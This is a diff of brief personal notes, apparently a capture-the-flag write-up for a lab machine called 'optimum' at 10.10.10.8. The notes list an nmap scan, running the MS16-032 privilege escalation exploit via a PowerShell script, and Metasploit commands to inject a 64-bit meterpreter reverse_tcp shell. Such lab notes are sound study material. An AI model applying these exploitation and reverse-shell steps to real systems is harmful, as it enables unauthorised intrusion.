@@ -1,6 +1,6 @@
 ## optimum 10.10.10.8
 
-windows server 2012
+windows server 2012 x64
 
 nmap port 80
 
@@ -40,11 +40,15 @@ Import-Module ./lol.ps1
 
 Invoke-MS16-032
 
-
-
 gjøre fra 32 til 64 bit shell
 
 `use windows/local/payload_inject`
 
 `set payload windows/x64/meterpreter/reverse_tcp`
+
+
+
+
+
+
 
